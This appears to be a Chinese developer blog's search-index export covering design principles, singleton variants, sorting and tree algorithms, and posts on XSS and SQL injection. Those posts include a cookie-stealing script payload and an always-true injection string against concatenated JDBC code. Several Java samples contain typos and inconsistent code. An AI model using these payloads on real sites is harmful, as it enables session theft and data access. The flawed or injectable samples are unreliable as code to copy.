&#125;&#125; 优缺点说明： Double-Check概念是多线程开发中常使用到的，如代码中所示，我们进行了两 次if (singleton == null)检查，这样就可以保证线程安全了。 这样，实例化代码只用执行一次，后面再次访问时，判断if (singleton == null)， 直接return实例化对象，也避免的反复进行方法同步 线程安全；延迟加载；效率较高 结论：在实际开发中，推荐使用这种单例设计模式 静态内部类 12345678910111213141516171819//静态内部类class SingleTon7 &#123; private static volatile SingleTon7 instance; private SingleTon7() &#123; &#125; //写一个静态内部类,该类中有一个静态属性SingleTon7 //静态内部类SingletonInstance在外部类SingleTon7在类装载的时候,并不会马上执行,不会导致静态内部类SingletonInstance马上装载 //在JVM中，类的转载是线程安全的，导致了INSTANCE的初始化是线程安全的 private static class SingletonInstance &#123; private static final SingleTon7 INSTANCE = new SingleTon7(); &#125; public static SingleTon7 getInstance() &#123; //当调用getInstance这个方法时,会去取静态内部类SingletonInstance里的INSTANCE属性,这时会导致SingletonInstance会被装载 return SingletonInstance.INSTANCE; &#125;&#125; 优缺点说明： 这种方式采用了类装载的机制来保证初始化实例时只有一个线程。 静态内部类方式在Singleton类被装载时并不会立即实例化，而是在需要实例化 时，调用getInstance方法，才会装载SingletonInstance类，从而完成Singleton的 实例化。 类的静态属性只会在第一次加载类的时候初始化，所以在这里，JVM帮助我们 保证了线程的安全性，在类进行初始化时，别的线程是无法进入的。 优点：避免了线程不安全，利用静态内部类特点实现延迟加载，效率高 结论：推荐使用. 枚举 123456789101112131415161718192021/** * @Author: Wizard * @Date: 2020/6/6 14:38 */public class Singleton8 &#123; public static void main(String[] args) &#123; Singleton instance = Singleton.INSTANCE; Singleton instance2 = Singleton.INSTANCE; System.out.println(instance == instance2);//true System.out.println(instance.hashCode()); System.out.println(instance2.hashCode()); &#125;&#125;//枚举enum Singleton &#123; INSTANCE; public void ok() &#123; System.out.println(\"ok\"); &#125;&#125; 优缺点说明： 这借助JDK1.5中添加的枚举来实现单例模式。不仅能避免多线程同步问题，而 且还能防止反序列化重新创建新的对象。 这种方式是Effective Java作者Josh Bloch 提倡的方式 结论：推荐使用 单例模式在JDK 应用的源码分析单例模式在JDK 应用的源码分析 JDK中，java.lang.Runtime就是经典的单例模式(饿汉式) 单例模式注意事项和细节说明 单例模式保证了 系统内存中该类只存在一个对象，节省了系统资源，对于一些需 要频繁创建销毁的对象，使用单例模式可以提高系统性能 当想实例化一个单例类的时候，必须要记住使用相应的获取对象的方法，而不是使用new 单例模式使用的场景：需要频繁的进行创建和销毁的对象、创建对象时耗时过多或 耗费资源过多(即：重量级对象)，但又经常用到的对象、工具类对象、频繁访问数 据库或文件的对象(比如数据源、session工厂等)","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"合成复用原则","slug":"合成复用原则","date":"2020-06-04T23:42:54.000Z","updated":"2021-04-11T17:11:28.792Z","comments":true,"path":"synthetic-reuse-principle/","link":"","permalink":"https://kayleh.top/synthetic-reuse-principle/","excerpt":"合成复用原则 Composite Resue Principle","text":"合成复用原则 Composite Resue Principle 基本介绍原则是尽量使用合成/聚合的方式，而不是使用继承。 123456不使用继承的方法：使用: 1.依赖(参数传递) 2.聚合(set) 3.组合(new) 设计原则核心思想 找出应用中可能需要变化之处，把他们独立出来，不要和那些不需要变化的代码混在一起。 针对接口编程，而不是针对实现编程 为了交互对象之间的松耦合设计而努力","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"迪米特法则","slug":"迪米特法则","date":"2020-06-04T19:09:31.000Z","updated":"2021-04-11T17:11:29.059Z","comments":true,"path":"dimits-law/","link":"","permalink":"https://kayleh.top/dimits-law/","excerpt":"基本介绍 Demeter Principle","text":"基本介绍 Demeter Principle 一个对象应该对其他对象保持最少的了解 类与类关系越密切，耦合度越大 迪米特法则又叫最少知道原则，即一个类对自己依赖的类知道的 越少越好。也就是说，对于被依赖的类不管多么复杂，都尽量将逻辑封装在类的内 部。对外除了提供的public 方法，不对外泄露任何信息 迪米特法则还有个更简单的定义：只与直接的朋友通信 直接的朋友：每个对象都会与其他对象有耦合关系，只要两个对象之间有耦合关系， 我们就说这两个对象之间是朋友关系。耦合的方式很多，依赖，关联，组合，聚合 等。其中，我们称出现成员变量，方法参数，方法返回值中的类为直接的朋友，而 出现在局部变量中的类不是直接的朋友。也就是说，陌生的类最好不要以局部变量 的形式出现在类的内部。 细节： 迪米特法则的核心是降低类之间的耦合 注意：由于每个类都减少了不必要的依赖，因此迪米特法则只是要求降低 类间(对象间)耦合关系， 并不是要求完全没有依赖关系","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"开闭原则","slug":"开闭原则","date":"2020-06-04T17:07:12.000Z","updated":"2021-04-11T17:11:28.870Z","comments":true,"path":"principle-of-opening-and-closing/","link":"","permalink":"https://kayleh.top/principle-of-opening-and-closing/","excerpt":"开闭原则 Open Closed Principle 基本介绍","text":"开闭原则 Open Closed Principle 基本介绍 开闭原则是编程中最基础、最重要的设计原则 一个软件实体如类，模块和函数应该对扩展开放，对修改关闭。用抽象构建框架，用实体扩展细节。 当软件需要变化时，尽量通过扩展软件实体的行为来实现变化，而不是通过修改已有的代码来实现变化。 编程中遵循其他原则，以及使用设计模式的目的就是遵循开闭原则。 12345678910111213141516171819202122232425262728293031323334public class Ocp&#123; public status void main(String[] args)&#123; GraphicEditor graphicEditor = new GraphicEditor(); graphicEditor.drawShape(new Rectangle()); &#125;&#125;class GraphicEditor&#123; public void drawShape(Shape shape)&#123; shape.draw(); &#125;&#125;//Shape类，基类abstract class Shape&#123; int m_type; public abstract void draw();//抽象方法&#125;class Rectangle extends Shape&#123; Rectangle()&#123; super.m_type = 1; &#125; @Override public void draw()&#123; System.out.println(\"绘制矩形\") &#125;&#125;class Circle extends Shape&#123; Circle()&#123; super.m_type = 2; &#125; @Override public void draw()&#123; System.out.println(\"绘制圆形\") &#125;&#125;","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"里氏替换原则","slug":"里氏替换原则","date":"2020-06-04T02:13:11.000Z","updated":"2021-04-11T17:11:29.072Z","comments":true,"path":"liskov-substitution-principle/","link":"","permalink":"https://kayleh.top/liskov-substitution-principle/","excerpt":"里氏替换原则 Liskov Substitution Principle 里氏替换原则在1988年，由麻省理工学院的一位姓里的女士提出的。","text":"里氏替换原则 Liskov Substitution Principle 里氏替换原则在1988年，由麻省理工学院的一位姓里的女士提出的。 如果对每个类型为T1的对象o1，都有类型为T2的对象o2，使得以T1定义的所有程序P在所有的对象o1都代换成o2时，程序P的行为没有发生变化，那么类型T2是类型T1的子类型。所有引用基类的地方必须能透明地使用其子类的对象。换句话说，既然抽象出来当作共同的实现方法就不应再具体实现类中重写。 在使用继承时，遵守里氏替换原则，在子类中尽量不要重写父类的方法 里氏替换原则告诉我们，继承实际上让两个类耦合性增强了，在适当的情况下，可以通过聚合，组合，依赖来解决问题。 1234567891011121314151617//A类class A&#123; //返回两个数的差 public in func1(int num1,int num2)&#123; return num1 - num2; &#125;&#125;//B类继承了A类class B extends A&#123; // ↓重写了A的方法 public int func1(int a,int b)&#123; return a + b; &#125; public int func2(int a,int b)&#123; return func1(a,b)+9; &#125;&#125; 改进： 12345678910111213141516171819202122232425262728class Base&#123; //把更加基础的方法和成员写到Base类&#125;//A类class A extends Base&#123; //返回两个数的差 public in func1(int num1,int num2)&#123; return num1 - num2; &#125;&#125;//B类继承了A类class B extends Base&#123; //如果B需要使用A类的方法，使用组合关系 private A a = new A(); // ↓重写了A的方法 public int func1(int a,int b)&#123; return a + b; &#125; public int func2(int a,int b)&#123; return func1(a,b)+9; &#125; //使用A的方法 public int func3(int a,int b)&#123; return this.a.func1(a,b); &#125;&#125;","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"依赖倒转原则","slug":"依赖倒转原则","date":"2020-06-03T04:29:20.000Z","updated":"2021-04-11T17:11:28.608Z","comments":true,"path":"dependence-reversal-principle/","link":"","permalink":"https://kayleh.top/dependence-reversal-principle/","excerpt":"依赖倒转原则 Dependence Inversion Priciple","text":"依赖倒转原则 Dependence Inversion Priciple 基本介绍 高层模块不应该依赖低层模块，二者都应该依赖其抽象 抽象不应该依赖细节，细节应该依赖抽象 依赖倒转的中心思想是面向接口编程 依赖倒转原则是基于这样的设计理念：相对于细节的多变性，抽象的东西要稳定的多。以抽象为基础搭建的架构比细节为基础的架构要稳定的多。在java中，抽象指的是接口或抽象类，细节就是具体的实现类 使用接口或抽象类的目的是制定好规范，而不涉及任何具体的操作，把展现细节的任务交给他们的实现类去完成 细节 低层模块尽量都要有抽象类或接口，或者两者都有，程序稳定性更好 变量的声明类型尽量是抽象类或接口，这样我们的变量引用和实际对象间，就存在一个缓冲层。利于程序扩展和优化 继承时遵循里氏替换原则 1通过接口传递实现依赖123456789101112131415161718192021interface IOpenAndClose&#123; //抽象方法 public void open(ITV tv);&#125;interface ITV&#123; //ITV接口 public void play();&#125;class Htc implements ITV&#123; @Override public void play() &#123; System.out.println(\"htc电视机，打开\"); &#125;&#125;//实现接口class OpenAndClose implements IOpenAndClose&#123; public void open(ITV tv)&#123; tv.play(); &#125;&#125; 2.通过构造方法依赖传递1234567891011121314151617181920212223242526interface IOpenAndClose&#123; //抽象方法 public void open(ITV tv);&#125;interface ITV&#123; //ITV接口 public void play();&#125;class Htc implements ITV&#123; @Override public void play() &#123; System.out.println(\"htc电视机，打开\"); &#125;&#125;//实现接口class OpenAndClose implements IOpenAndClose&#123; public ITV tv; public OpenAndClose(ITV tv)&#123; //构造器 this.tv = tv; &#125; public void open()&#123; tv.play(); &#125;&#125; 3.通过setter方法传递123456789101112131415161718192021222324252627interface IOpenAndClose&#123; //抽象方法 public void open(ITV tv); public void name(ITV tv);&#125;interface ITV&#123; //ITV接口 public void play();&#125;class Htc implements ITV&#123; @Override public void play() &#123; System.out.println(\"htc电视机，打开\"); &#125;&#125;//实现接口class OpenAndClose implements IOpenAndClose&#123; public ITV tv; public setTv(ITV tv)&#123; //构造器 this.tv = tv; &#125; public void open()&#123; tv.play(); &#125;&#125;","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"接口隔离原则","slug":"接口隔离原则","date":"2020-06-03T01:56:04.000Z","updated":"2021-04-11T17:11:28.886Z","comments":true,"path":"interface-isolation-principle/","link":"","permalink":"https://kayleh.top/interface-isolation-principle/","excerpt":"接口隔离原则 Interface Segregation Principle","text":"接口隔离原则 Interface Segregation Principle 基本介绍 客户端不应该依赖它不需要的接口，即一个类对另一个类的依赖应该建立在最小的接口上。 类A通过接口Interface依赖类D，类C通过接口Interface依赖类D，如果接口Interface对于类A和来说不是最小接口那么类B和类D必须去实现他们不需要的方法。 按隔离原则应当这样处理： 将接口Interface拆分为独立的几个接口，类A和类C分别与他们需要的接口建立依赖关系。也就是采用接口隔离原则。","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"单一职责原则","slug":"单一职责原则","date":"2020-06-03T00:57:48.000Z","updated":"2021-04-11T17:11:28.772Z","comments":true,"path":"single-responsibility-principle/","link":"","permalink":"https://kayleh.top/single-responsibility-principle/","excerpt":"单一职责原则","text":"单一职责原则 基本介绍 对类来说，即一个类应该只负责一个原则。如果A负责两个不同的原则：职责1，职责2。当职责1需求变更而改变A时，可能导致职责2执行错误。所以需要将类A的粒度分解为A1，A2 细节 降低类的复杂度，一个类只负责一项职责。 降低类的可读性，可维护性。 降低变更引起的风险。 通常情况下，我们应当遵守单一职责原则，只有逻辑足够简单，才可以在代码级违反单一职责原则；只有类中方法数量足够少，可以在方法级别保持单一原则。","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"XSS跨站脚本攻击","slug":"XSS跨站脚本攻击","date":"2020-05-31T04:58:53.000Z","updated":"2021-04-15T15:10:59.177Z","comments":true,"path":"xss-crosssite-scripting-attack/","link":"","permalink":"https://kayleh.top/xss-crosssite-scripting-attack/","excerpt":"XSS跨站脚本攻击","text":"XSS跨站脚本攻击 在做社区项目的时候，发现了一个XSS漏洞。 什么是XSS跨站脚本攻击？ XSS攻击全称跨站脚本攻击，是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。 在点击回复二级评论时，JavaScript脚本会注入页面: 示例： 然后客户端就调用脚本alert导致无限弹窗。 还可以使用 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 获取页面cookie，比如登录的token。 解决办法： Jsoup使用标签白名单的机制用来进行防止XSS攻击 参考： [XSS跨站脚本攻击]","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://kayleh.top/tags/security/"}]},{"title":"SQL注入式攻击","slug":"SQL注入式攻击","date":"2020-05-30T05:13:52.000Z","updated":"2021-04-15T15:10:55.349Z","comments":true,"path":"sql-injection-attacks/","link":"","permalink":"https://kayleh.top/sql-injection-attacks/","excerpt":"SQL注入式攻击","text":"SQL注入式攻击 攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。在某些表单中，用户输入的内容直接用来构造（或者影响）动态SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击。 常见的SQL注入式攻击主要是利用Statement的缺陷，服务端验证： 12345678910111213141516171819@Override public void login(Account account) throws SQLException &#123; String sql = \"insert into account values(null,\" + account.userName + \",\" + account.password + \")\"; try (Connection conn = DriverManager.getConnection(\"jdbc:mysql://127.0.0.1:3306/account?characterEncoding=UTF-8\", \"root\", \"password\")) &#123; try (Statement stmt = conn.createStatement()) &#123; try (ResultSet rs = stmt.executeQuery(\"SELECT id, grade, name, gender FROM students WHERE gender=1\")) &#123; while (rs.next()) &#123; int id = rs.getInt(1); String username = rs.getString(2); String password = rs.getString(3); &#125; &#125; &#125; &#125; &#125; 客户端 1234567891011121314151617181920212223242526&lt;link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css\" integrity=\"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\" crossorigin=\"anonymous\"&gt;&lt;link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap-theme.min.css\" integrity=\"sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp\" crossorigin=\"anonymous\"&gt;&lt;script src=\"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js\" integrity=\"sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;div class=\"col-xs-8 col-sm-8 col-md-8 jumbotron\"&gt; &lt;form&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"exampleInputEmail1\"&gt;Username&lt;/label&gt; &lt;input type=\"email\" class=\"form-control\" id=\"exampleInputEmail1\" placeholder=\"Email\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"exampleInputPassword1\"&gt;Password&lt;/label&gt; &lt;input type=\"password\" class=\"form-control\" id=\"exampleInputPassword1\" placeholder=\"Password\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"exampleInputFile\"&gt;File input&lt;/label&gt; &lt;input type=\"file\" id=\"exampleInputFile\"&gt; &lt;p class=\"help-block\"&gt;Example block-level help text here.&lt;/p&gt; &lt;/div&gt; &lt;div class=\"checkbox\"&gt; &lt;label&gt; &lt;input type=\"checkbox\"&gt; Check me out &lt;/label&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-default\"&gt;Submit&lt;/button&gt; &lt;/form&gt;&lt;/div&gt; 如果是客户端精心构造的字符串，例如 12name = \"kayleh' OR pass=\", pass = \" OR pass='\"' or 1= ' 1 命令行永远为真，导致注入成功。 所以使用JDBC时，尽量使用速度比较快且安全的 PreparedStatement ，PreparedStatement 使用的是预编译机制。","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://kayleh.top/tags/security/"}]},{"title":"binary sort tree","slug":"二叉排序树","date":"2020-05-20T04:42:23.000Z","updated":"2021-04-11T17:11:28.572Z","comments":true,"path":"binary-sort-tree/","link":"","permalink":"https://kayleh.top/binary-sort-tree/","excerpt":"二叉排序树二叉排序树：BST: (Binary Sort(Search) Tree), 对于二叉排序树的任何一个非叶子节点，要求左子节点的值比当前节点的值小，右子节点的值比当前节点的值大。 如果有相同的值，可以将该节点放在左子节点或右子节点","text":"二叉排序树二叉排序树：BST: (Binary Sort(Search) Tree), 对于二叉排序树的任何一个非叶子节点，要求左子节点的值比当前节点的值小，右子节点的值比当前节点的值大。 如果有相同的值，可以将该节点放在左子节点或右子节点 ​ 数据 (7, 3, 10, 12, 5, 1, 9) ，对应的二叉排序树为 ​ ​ ↓ ​ 二叉排序树的删除情况比较复杂，有下面三种情况需要考虑 1)删除叶子节点 (比如：2, 5, 9, 12) 2)删除只有一颗子树的节点 (比如：1) 3)删除有两颗子树的节点. (比如：7, 3，10 ) 1234567891011121314151617181920212223242526272829303132333435第一种情况:删除叶子节点 (比如：2, 5, 9, 12)思路(1) 需求先去找到要删除的结点 targetNode(2) 找到targetNode 的 父结点 parent (3) 确定 targetNode 是 parent的左子结点 还是右子结点(4) 根据前面的情况来对应删除左子结点 parent.left = null右子结点 parent.right = null;第二种情况: 删除只有一颗子树的节点 比如 1思路(1) 需求先去找到要删除的结点 targetNode(2) 找到targetNode 的 父结点 parent (3) 确定targetNode 的子结点是左子结点还是右子结点(4) targetNode 是 parent 的左子结点还是右子结点(5) 如果targetNode 有左子结点5. 1 如果 targetNode 是 parent 的左子结点parent.left = targetNode.left;5.2 如果 targetNode 是 parent 的右子结点parent.right = targetNode.left;(6) 如果targetNode 有右子结点6.1 如果 targetNode 是 parent 的左子结点parent.left = targetNode.right;6.2 如果 targetNode 是 parent 的右子结点parent.right = targetNode.right情况三 ： 删除有两颗子树的节点. (比如：7, 3，10 )思路(1) 需求先去找到要删除的结点 targetNode(2) 找到targetNode 的 父结点 parent (3) 从targetNode 的右子树找到最小的结点(4) 用一个临时变量，将 最小结点的值保存 temp = 11(5) 删除该最小结点(6) targetNode.value = temp 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266package binarysorttree;/** * @Author: Wizard * @Date: 2020/5/20 11:42 */public class BinarySortTreeDemo &#123; public static void main(String[] args) &#123;// int[] arr = &#123;7, 3, 10, 12, 5, 1, 9&#125;; int[] arr = &#123;7,3&#125;; BinarySortTree binarySortTree = new BinarySortTree(); for (int i = 0; i &lt; arr.length; i++) &#123; binarySortTree.add(new Node(arr[i])); &#125; binarySortTree.infixOrder(); binarySortTree.delNode(7); System.out.println(\"删除后\"); binarySortTree.infixOrder(); &#125;&#125;//创建二叉排序树class BinarySortTree &#123; private Node root; //查找要删除的结点 public Node search(int value) &#123; if (root == null) &#123; return null; &#125; else &#123; return root.search(value); &#125; &#125; //查找父结点 public Node searchParent(int value) &#123; if (root == null) &#123; return null; &#125; else &#123; return root.searchParent(value); &#125; &#125; /** * 右边找最小的 * 左边找最大的 * * 返回的 以node为根结点的最小结点的值 * 删除以node为根结点的最小结点的值 * * @param node 传入的结点（当做二叉排序树的根结点） * @return 返回的 以node为根结点的最小结点的值 */ public int delRightTreeMin(Node node) &#123; Node target = node; //循环的查找左子节点，就会找到最小值 while (target.left != null) &#123; target = target.left; &#125; //这是target就指向了最小结点 //删除最小结点 delNode(target.value); return target.value; &#125; //删除结点 public void delNode(int value) &#123; if (root == null) &#123; return; &#125; else &#123; //需要先去找到要删除的结点 targetNode Node targetNode = search(value); //如果没有找到要删除的结点 if (targetNode == null) &#123; return; &#125; //如果发现targetNode没有父结点（就是根结点）(只有一个结点) if (root.left == null &amp;&amp; root.right == null) &#123; root = null; return; &#125; //去找到targetNode的父结点 Node parent = searchParent(value); //如果要删除的结点是叶子结点 if (targetNode.left == null &amp;&amp; targetNode.right == null) &#123; //判断targetNode是父结点的左子结点还是右子结点 if (parent.left != null &amp;&amp; parent.left.value == value) &#123; parent.left = null; &#125; else if (parent.right != null &amp;&amp; parent.right.value == value) &#123; parent.right = null; &#125; &#125; else if (targetNode.left != null &amp;&amp; targetNode.right != null) &#123; //删除有两颗子树的结点 int min = delRightTreeMin(targetNode.right);//target右边最小的值 targetNode.value = min; &#125; else &#123; //删除只有一颗子树的结点 //如果要删除的结点有左子结点// System.out.println(parent); if (parent!=null) &#123; if (targetNode.left != null) &#123; //如果targetNode是parent的左子结点 if (parent.left.value == value) &#123; parent.left = targetNode.left; &#125; else &#123; //如果targetNode是parent的右子结点 parent.right = targetNode.left; &#125; &#125; else &#123; //如果要删除的结点有右子结点 if (parent.left.value == value) &#123; //如果targetNode是parent的左子结点 parent.left = targetNode.right; &#125; else &#123; //如果targetNode是parent的右子结点 parent.right = targetNode.right; &#125; &#125; &#125;else &#123; if (root.left!=null)&#123; root = root.left; &#125;else &#123; root = root.right; &#125; &#125; &#125; &#125; &#125; //添加结点的方法 public void add(Node node) &#123; if (root == null) &#123; root = node; &#125; else &#123; root.add(node); &#125; &#125; //中序遍历方法 public void infixOrder() &#123; if (root != null) &#123; root.infixOrder(); &#125; else &#123; System.out.println(\"当前二叉排序树为空，不能遍历\"); &#125; &#125;&#125;//创建Node结点class Node &#123; int value; Node left; Node right; @Override public String toString() &#123; return \"Node&#123;\" + \"value=\" + value + '&#125;'; &#125; /** * 查找要删除的结点 * * @param value 希望删除的结点的值 * @return 如果找到返回该结点，否则返回null */ public Node search(int value) &#123; if (value == this.value) &#123; //找到就是该结点 return this; &#125; else if (value &lt; this.value) &#123; //如果查找的值小于当前结点，向左子树递归查找 //如果左子结点为空 if (this.left == null) &#123; return null; &#125; return this.left.search(value); &#125; else &#123; //如果查找的值不小于当前结点，向右子树递归查找 if (this.right == null) &#123; return null; &#125; return this.right.search(value); &#125; &#125; /** * 查找要删除结点的父结点 * * @param value 要找到结点的值 * @return 返回的是要删除的结点的父结点，如果没有就返回null */ public Node searchParent(int value) &#123; //如果当前结点就是要删除的结点的父结点，就返回 if ((this.left != null &amp;&amp; this.left.value == value) || (this.right != null &amp;&amp; this.right.value == value)) &#123; return this; &#125; else &#123; //如果查找的值小于当前结点的值，并且当前结点的左子结点不为空 if (value &lt; this.value &amp;&amp; this.left != null) &#123; return this.left.search(value);//向左子树递归查找 &#125; else if (value &gt;= this.value &amp;&amp; this.right != null) &#123; return this.right.search(value);//向右子树递归查找 &#125; else &#123; return null;//没有找到父结点 &#125; &#125; &#125; public Node(int value) &#123; this.value = value; &#125; //添加结点的方式 //递归的形式添加结点，需要满足二叉排序树的要求 public void add(Node node) &#123; if (node == null) &#123; return; &#125; //判断传入的结点的值，和当前子树的根结点的值的关系 if (node.value &lt; this.value) &#123; //如果当前结点的左子结点为null if (this.left == null) &#123; //把结点挂在左子结点 this.left = node; &#125; else &#123; //如果左子结点不为空，向左子树递归添加 this.left.add(node); &#125; &#125; else &#123; //如果 添加的结点的值 大于 根结点的值 if (this.right == null) &#123; this.right = node; &#125; else &#123; this.right.add(node); &#125; &#125; &#125; //中序遍历 public void infixOrder() &#123; if (this.left != null) &#123; this.left.infixOrder(); &#125; System.out.println(this); if (this.right != null) &#123; this.right.infixOrder(); &#125; &#125;&#125;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"heap-sort","slug":"堆排序","date":"2020-05-18T04:40:11.000Z","updated":"2021-04-11T17:11:28.827Z","comments":true,"path":"heap-sort/","link":"","permalink":"https://kayleh.top/heap-sort/","excerpt":"堆排序","text":"堆排序 1.堆排序是利用堆这种数据结构而设计的一种算法，堆排序是一种选择排序，它的最坏，最好，平均复杂度均为O(nlogn)，它也是不稳定的排序。 2.堆是具有以下性质的完全二叉树：每个结点的值都大于或等于其左右孩子结点的值，称为大顶堆。没有要求结点的左孩子的值和右孩子的值大小关系。 3.每个结点的值都小于或等于其左右孩子结点的值，称为小顶堆 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687package sort;import java.util.Arrays;/** * @Author: Wizard * @Date: 2020/5/18 21:16 */public class heapSort &#123; public static void main(String[] args) &#123; //要求将数组进行升序排列 &#125; //编写一个堆排序的方法 public static void heapSort(int arr[]) &#123; int temp = 0; System.out.println(\"堆排序！\"); // i 第一个非叶子结点 // 这里的目的是把最大的数交换到堆顶，成为一个大顶堆结构 for (int i = arr.length / 2 - 1; i &gt;= 0; i--) &#123; adjustHeap(arr, i, arr.length); System.out.println(Arrays.toString(arr)); &#125; /* 将堆顶元素于末尾元素交换，将最大元素“沉”到数组末端 重新调整结构，使其满足堆定义，然后继续交换堆顶元素与当前末尾元素，反复执行调整+交换步骤，直到整个序列有序 */ //一共5个数，调整4个数就可以了 for (int j = arr.length - 1; j &gt; 0; j--) &#123; temp = arr[j]; arr[j] = arr[0];//arr[0] 是上面调整后的最大值 arr[0] = temp; adjustHeap(arr, 0, j); System.out.println(\"第\"+(arr.length-j)+\"次沉\"+Arrays.toString(arr)); &#125; System.out.println(Arrays.toString(arr)); //每次遍历把最大的数（在调整之后的父节点，第一位）沉到数组的末端 //然后 再调整 把最大的数交换到堆顶（adjustHeap），再沉到数组的末端的位置-1，随着j的递减，末尾的前几个数字逐渐确定（调整的范围减少） &#125; //将一个数组(二叉树),调整为一个大顶堆 /** * 功能：完成将以 i 对应的非叶子结点的树调整为大顶堆 * int arr[] = &#123;4,6,8,5,9&#125;; → i = 1 → adjustHeap → 得到&#123;4,9,8,5,6&#125; * 再次调用adjustHeap 传入的是 i= 0 → 得到&#123;9,6,8,5,4&#125; * * @param arr 待调整的数组 * @param i 表示非叶子结点在数组中的索引 * @param lenght 表示归多少个元素继续调整，length 是在逐渐的减少 */ public static void adjustHeap(int arr[], int i, int lenght) &#123; int temp = arr[i];//取出当前元素的值，保存在临时变量， 以 i 作为父节点（局部） //开始调整 //k = i对应的左子节点 for (int k = 2 * i + 1; k &lt; lenght; k = 2 * i + 1) &#123; if (k + 1 &lt; lenght &amp;&amp; arr[k] &lt; arr[k + 1]) &#123; //说明左子节点的值小于右子节点 k++;//让 k 指向右子节点 &#125; if (arr[k] &gt; temp) &#123; //如果子节点大于父节点 //就把较大的值赋值给当前节点 arr[i] = arr[k]; // ! i指向k 继续循环比较 i = k; //把i（父节点）指向 k（子节点）。作为父节点继续循环 &#125; else &#123; //如果子节点小于父节点 //堆排序是从左至右，从下至上 break; &#125; &#125; //当for循环结束后，已经将以i为父节点的树的最大值，放在了最顶（局部） arr[i] = temp;//将temp值放到调整后的位置 //adjustHeap()方法中依然要循环, 是因为最后在堆排序的时候是从下到上的, 排序中向上调用这个方法时 , i也会往上走, 这时再次调用adjustHeapt //这时再次调用adjustHeap方法时, i就不是最后一个非叶子节点了, 会破坏原先已经排序好的大顶堆, 所以需要循环往下将被破坏的大顶堆重新建立起来 &#125;&#125;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"7 sorting algorithms","slug":"7种排序算法","date":"2020-05-17T05:42:21.000Z","updated":"2021-04-11T17:11:28.070Z","comments":true,"path":"7-sorting-algorithms/","link":"","permalink":"https://kayleh.top/7-sorting-algorithms/","excerpt":"7种排序算法冒泡排序","text":"7种排序算法冒泡排序 冒泡排序（BubbleSorting)的基本思想是：通过对待排序序列从前向后（从下标较小的元素开始）,依次比较相邻元素的值，若发现逆序则交换，使值较大的元素逐渐从前移向后部。 代码实现 1234567891011121314151617181920212223242526// 将前面的冒泡排序算法，封装成一个方法 public static void bubbleSort(int[] arr) &#123; // 冒泡排序 的时间复杂度 O(n^2), 自己写出 int temp = 0; // 临时变量 boolean flag = false; // 标识变量，表示是否进行过交换 for (int i = 0; i &lt; arr.length - 1; i++) &#123; for (int j = 0; j &lt; arr.length - 1 - i; j++) &#123; // 如果前面的数比后面的数大，则交换 if (arr[j] &gt; arr[j + 1]) &#123; flag = true; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; &#125; &#125; //System.out.println(\"第\" + (i + 1) + \"趟排序后的数组\"); //System.out.println(Arrays.toString(arr)); if (!flag) &#123; // 在一趟排序中，一次交换都没有发生过 break; &#125; else &#123; flag = false; // 重置flag!!!, 进行下次判断 &#125; &#125; 插入排序 插入排序（insertSorting) 